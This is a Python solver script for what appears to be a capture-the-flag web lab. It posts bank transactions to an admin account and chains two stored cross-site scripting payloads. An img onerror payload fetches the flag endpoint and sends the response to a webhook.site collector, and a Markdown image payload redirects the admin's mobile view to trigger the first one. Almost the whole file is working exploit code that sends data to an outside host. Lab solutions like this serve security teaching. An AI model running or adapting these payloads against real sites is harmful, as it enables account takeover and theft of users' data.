import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

BASE_URL = "https://netquocca.quoccacorp.com"
API_BASE_URL = "https://api.netquocca.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    # Recon: https://netquocca.quoccacorp.com/?transaction=76
    def get_source_code(self) -> str:
        transaction_id = self.session.get(f"{API_BASE_URL}/transactions").json()["transactions"][0]["id"]
        response = self.session.get(BASE_URL, params={"transaction": transaction_id})
        return response.text

    def main(self):
        response = self.session.get(f"{API_BASE_URL}/accounts")
        my_account = response.json()["accounts"][0]
        my_bsb, my_account_number = my_account["bsb"], my_account["account_number"]

        ADMIN_BSB = "069-420"
        ADMIN_ACCOUNT_NUMBER = "00000000"

        # Exploit for loop mutation bug
        DESKTOP_SITE_PAYLOAD = f'''<img src="x" INVALIDATTRIBUTE onerror="fetch(`{API_BASE_URL}/flag`)
.then(response => response.text())
.then(responseText => fetch(`{self.webhooksite.url}?q=${{responseText}}`))">'''
        response = self.session.post(f"{API_BASE_URL}/transactions", json={
            "from_account": { "bsb": my_bsb, "account_number": my_account_number },
            "to_account": { "bsb": ADMIN_BSB, "account_number": ADMIN_ACCOUNT_NUMBER },
            "description": DESKTOP_SITE_PAYLOAD,
            "amount": 0.01
        })
        transaction_id = response.json()["id"]

        # No spaces allowed
        MOBILE_SITE_PAYLOAD = f'''![x]("onerror="document.location='{BASE_URL}/?transaction={transaction_id}&desktop')'''
        response = self.session.post(f"{API_BASE_URL}/transactions", json={
            "from_account": { "bsb": my_bsb, "account_number": my_account_number },
            "to_account": { "bsb": ADMIN_BSB, "account_number": ADMIN_ACCOUNT_NUMBER },
            "description": MOBILE_SITE_PAYLOAD,
            "amount": 0.01
        })

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
